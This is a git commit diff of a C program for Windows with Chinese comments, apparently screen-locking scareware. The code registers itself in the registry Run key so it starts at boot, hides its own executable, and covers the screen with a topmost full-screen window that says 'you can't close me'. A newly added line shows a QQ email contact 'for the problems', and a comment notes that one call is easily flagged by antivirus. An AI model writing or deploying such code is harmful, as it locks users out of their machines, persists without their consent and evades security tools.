7a87e5252032169c989163b26b7e92564acb4fac
wufake <wufake70@gmail.com>
2023-09-16 17:04:37 +0800

    16/9/2023 17:05:18

--- .script/test.c
+++ .script/test.c
@@ -2,7 +2,6 @@
 // #include <stdlib.h>
 // #include <windows.h>
 
-
 #include "test_1.c"
 
 /*
@@ -10,42 +9,45 @@ gcc 编译命令
 gcc -o .\test.exe .\test.c -mwindows -user32
 */
 
-// 用于存储自定义字体
-HFONT g_hFont = NULL;  
-// 自定义文本颜色，这里设置为红色
-COLORREF g_textColor = RGB(255, 0, 0);  
-
-
 // WindowProc 是一个回调函数，用于处理窗口消息的函数。
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
+    // 用于存储自定义字体
+    HFONT g_hFont = CreateFont(
+        34,                     // 字体高度
+        0,                      // 字体宽度
+        0,                      // 字体倾斜度
+        0,                      // 字体倾斜度
+        FW_BOLD,                // 字体粗细，使用 FW_BOLD 表示加粗字体
+        FALSE,                  // 是否斜体
+        FALSE,                  // 是否下划线
+        FALSE,                  // 是否删除线
+        DEFAULT_CHARSET,        // 字符集
+        OUT_DEFAULT_PRECIS,     // 输出精度
+        CLIP_DEFAULT_PRECIS,    // 剪辑精度
+        1,        // 字体质量
+        DEFAULT_PITCH | FF_SWISS,   // 字体间距和字体系列
+        "Arial"                 // 字体名称
+    ); 
+    HFONT g_hFont1 = CreateFont(
+        20,0,0,0,FW_BOLD,FALSE,FALSE,FALSE,DEFAULT_CHARSET,
+        OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,1,
+        DEFAULT_PITCH | FF_SWISS,"Arial"); 
+        
+    // 自定义文本颜色，这里设置为红色
+    COLORREF g_textColor = RGB(255, 0, 0);  
+    // 获取窗口客户区的大小
+    RECT clientRect;
+    GetClientRect(hwnd, &clientRect);
+    HWND hEdit=NULL;
+
     switch (uMsg) {
         case WM_CREATE:
         {
             // 使用 SetWindowPos 函数将窗口置前
             SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
-
-            // 创建字体
-            g_hFont = CreateFont(
-                20,                     // 字体高度
-                0,                      // 字体宽度
-                0,                      // 字体倾斜度
-                0,                      // 字体倾斜度
-                FW_BOLD,                // 字体粗细，使用 FW_BOLD 表示加粗字体
-                FALSE,                  // 是否斜体
-                FALSE,                  // 是否下划线
-                FALSE,                  // 是否删除线
-                DEFAULT_CHARSET,        // 字符集
-                OUT_DEFAULT_PRECIS,     // 输出精度
-                CLIP_DEFAULT_PRECIS,    // 剪辑精度
-                1,        // 字体质量
-                DEFAULT_PITCH | FF_SWISS,   // 字体间距和字体系列
-                "Arial"                 // 字体名称
-            );
-
-            
+                        
             return 0;
         }
-
         case WM_PAINT:
         {
             PAINTSTRUCT ps;
@@ -55,25 +57,30 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
             HFONT hOldFont = (HFONT)SelectObject(hdc, g_hFont);
             SetTextColor(hdc, g_textColor);
 
-            // 获取窗口客户区的大小
-            RECT clientRect;
-            GetClientRect(hwnd, &clientRect);
-
             // 计算文本的矩形区域
             RECT textRect;
             textRect.left = clientRect.left + 50;    // 设置文本的左边界
-            textRect.top = clientRect.top + 50;      // 设置文本的上边界
+            textRect.top = clientRect.top + 300;      // 设置文本的上边界
             textRect.right = clientRect.right - 50;  // 设置文本的右边界
-            textRect.bottom = clientRect.bottom - 50;// 设置文本的下边界
+            textRect.bottom = clientRect.top + 350;// 设置文本的下边界
 
             // 绘制文本
             SetBkMode(hdc, TRANSPARENT);  // 设置背景模式为透明，确保文本背景不会被绘制
             // 系统会乱码
             // DrawText(hdc, "你关不了我,(¬◡¬)✧(¬◡¬ )✧", -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
-            DrawTextW(hdc, L"你关不了我,(¬◡¬)✧(¬◡¬)✧", -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+            DrawTextW(hdc, L"你关不了我 (¬◡¬)✧ (¬◡¬)✧", -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
 
             // 恢复原有的字体
             SelectObject(hdc, hOldFont);
+
+            HFONT hOldFont1 = (HFONT)SelectObject(hdc, g_hFont1);
+            SetTextColor(hdc, RGB(50,0,0));
+            textRect.left=clientRect.right-400;
+            textRect.right=clientRect.right;
+            textRect.top=clientRect.bottom-100;
+            textRect.bottom=clientRect.bottom;
+            DrawTextW(hdc, L"Contact 2953815063@qq.com for the problems", -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+            SelectObject(hdc, hOldFont1);
 
             EndPaint(hwnd, &ps);
             break;
@@ -82,7 +89,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
         // 关闭窗口(状态栏叉掉)
         case WM_CLOSE:
             // 删掉temp.mp3
-            remove("temp.mp3");
+            // remove("temp.mp3");
 
             // 释放字体资源
             if (g_hFont != NULL)
@@ -107,13 +114,11 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
             PostQuitMessage(0);
             return 0;
     }
-
     return DefWindowProc(hwnd, uMsg, wParam, lParam);
 }
 
 
 int main() {
-
     // 开机自启动
     // 获取当前可执行文件路径
     char exePath[MAX_PATH];
@@ -130,7 +135,6 @@ int main() {
     RegCloseKey(hKey);
     // 将文件属性设置为隐藏
     SetFileAttributes(exePath, FILE_ATTRIBUTE_HIDDEN);
-
 
 
     // 注册窗口类
@@ -152,7 +156,7 @@ int main() {
         // 创建窗口
         hwnd = CreateWindow(
             "MyWindowClass",       // 窗口类型
-            "hello wrold",          // 窗口名字
+            "HowAreYou",          // 窗口名字
             WS_POPUP | WS_VISIBLE | WS_BORDER,
             0,0, screen_width,screen_height,
             NULL,
@@ -178,11 +182,11 @@ int main() {
             DispatchMessage(&msg);
             // 设置窗口位置
             // SetWindowPos(hwnd, NULL, rand()%(screen_width-200), rand()%(screen_height-100), 200, 100, SWP_NOZORDER | SWP_NOSIZE);
+            
+            // 容易被查杀
             SetForegroundWindow(hwnd);
-            SetFocus(hwnd);
-
+            // SetFocus(hwnd);
         }
     }
-
     return 0;
 }
